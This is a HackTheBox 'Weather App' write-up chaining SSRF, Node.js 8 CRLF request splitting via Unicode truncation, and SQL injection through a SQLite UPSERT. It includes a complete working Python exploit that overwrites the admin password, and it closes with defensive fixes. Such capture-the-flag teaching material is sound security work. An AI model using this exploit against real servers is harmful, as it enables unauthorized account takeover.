---
title: "Weather App"
date: 2027-03-16 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, request-smuggling, sql-injection, nodejs, cve-2018-12116, cwe-93]
description: "An Easy Web challenge that chains three bugs: an SSRF weather fetcher, an ancient Node.js HTTP client that turns Unicode into raw CRLF, and a localhost-only register endpoint with a SQL injection. We smuggle a request that looks like it came from 127.0.0.1, overwrite the admin password with a SQLite UPSERT, and log in."
---

## Overview

`Weather App` is an Easy HackTheBox **Web** challenge. It's a small Node.js + Express
app backed by SQLite, running on the long-EOL `node:8.12.0` image. The flag lives behind
an admin login whose password is 32 random bytes — unguessable. The path to it chains
three weaknesses: a [Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
"weather" endpoint, an outbound [HTTP request-splitting](https://cwe.mitre.org/data/definitions/93.html)
bug in the old Node HTTP client ([CVE-2018-12116](https://nvd.nist.gov/vuln/detail/CVE-2018-12116)),
and a localhost-only `/register` route with a [SQL injection](https://cwe.mitre.org/data/definitions/89.html).

## The technique

Reading the source, three routes matter:

- `POST /register` — only served when `req.socket.remoteAddress` is `127.0.0.1`, and it
  builds its query by **raw string interpolation** (`INSERT INTO users (username,password) VALUES ('${user}','${pass}')`).
- `POST /login` — returns the flag when `isAdmin(user,pass)` is true. This one uses a
  **prepared statement**, so it's not injectable.
- `POST /api/weather` — fetches `http://${endpoint}/data/2.5/weather?q=${city},${country}&...`,
  with `endpoint`, `city`, and `country` all attacker-controlled. That's the SSRF.

The `admin` row is seeded with a random password, so we can't just guess it. But `/register`
*can* modify the users table — it's only fenced off by a source-IP check. If we can make a
request that **appears to come from `127.0.0.1`**, we reach the injectable INSERT.

That's where the Node version matters. Node.js ≤ 8's HTTP client serializes the request
path to latin1 by **truncating each Unicode codepoint to its low byte**. So:

- `U+010D` → `0x0D` = **CR**
- `U+010A` → `0x0A` = **LF**
- `U+0120` → `0x20` = **space**

By stuffing those characters into `city`/`country` (which land in the outbound URL's query),
we inject real CRLFs and **split the outbound request**, smuggling a second, complete HTTP
request on the same socket — a `POST /register` that the server makes *to itself*, sailing
straight past the `127.0.0.1` check.

The last piece: we can't `INSERT` a second `admin` (the column is `UNIQUE`), so we use
SQLite's **UPSERT** to overwrite the existing admin's password instead:

```sql
INSERT INTO users (username,password) VALUES ('admin','k')
ON CONFLICT(username) DO UPDATE SET password='pwned123' --')
```

## Solution

Three requests end up on the wire from one `/api/weather` call: `city` terminates the
legitimate `GET` and opens the `POST /register` line; `country` finishes the POST headers
and body (with an exact `Content-Length`) and then adds a padding `GET /asdf` that swallows
the app's trailing `/data/2.5/weather?...&appid=` bytes. The POST body itself is plain
URL-encoded (`+` for space, `%27` for `'`), so only the *structural* HTTP bytes need the
Unicode trick.

Create `solve.py`:

```python
import sys, requests
from urllib.parse import quote_plus

base = "http://" + sys.argv[1]
NEW_PW = "pwned123"

nl = "čĊ"   # CR LF  (truncated server-side to \r\n)
sp = "Ġ"         # space  (truncated to 0x20)

sqli = f"k') ON CONFLICT(username) DO UPDATE SET password='{NEW_PW}' --"
body = "username=admin&password=" + quote_plus(sqli)

# city: end the GET request line, open the smuggled POST line
city = ("testing" + sp+"HTTP/1.1"+nl + "Host:"+sp+"127.0.0.1"+nl
        + "Connection:"+sp+"close"+nl + nl + "POST"+sp+"/register?1=2")

# country: finish the POST headers + body, then a padding GET eats the trailing path
country = ("SK" + sp+"HTTP/1.1"+nl + "Host:"+sp+"127.0.0.1"+nl
           + "Connection:"+sp+"close"+nl
           + "Content-Type:"+sp+"application/x-www-form-urlencoded"+nl
           + "Content-Length:"+sp+str(len(body))+nl + nl + body + nl+nl + "GET"+sp+"/asdf")

try:
    requests.post(f"{base}/api/weather",
                  data={"endpoint": "127.0.0.1", "city": city, "country": country}, timeout=8)
except requests.exceptions.RequestException:
    pass   # the split self-connection hangs; the smuggled UPSERT still ran

r = requests.post(f"{base}/login", data={"username": "admin", "password": NEW_PW}, timeout=10)
print(r.text.strip())
```

Run it against the instance:

```bash
python3 solve.py <target-host>:<port>
# HTB{...}
```

The `/api/weather` call never returns cleanly — the split self-connection just hangs — but
that's expected. The smuggled `POST /register` already overwrote the password, so the
subsequent `/login` as `admin` returns the flag.

## Why it worked

Three small mistakes compounded. The app trusted `remoteAddress` as an authorization
boundary, but SSRF makes "localhost only" meaningless — the server can be coerced into
talking to itself. The ancient Node runtime never sanitized control characters in request
paths, so chosen Unicode codepoints became raw CRLF and handed us full control of the
outbound bytestream. And the `/register` query was built by string interpolation (the source
even carries a `// TODO: add parameterization` comment), turning a reachable endpoint into a
write primitive over the users table.

## Fix / defense

- **Parameterize** the register query — exactly what `isAdmin` already does with `?` placeholders.
- Don't gate authorization on `req.socket.remoteAddress`; SSRF defeats source-IP checks. Use real authentication.
- **Allow-list** the SSRF fetch host and reject control/non-ASCII characters in any user input that reaches an outbound URL.
- Upgrade Node.js — modern releases reject control characters in request paths, which kills the request-splitting primitive entirely.
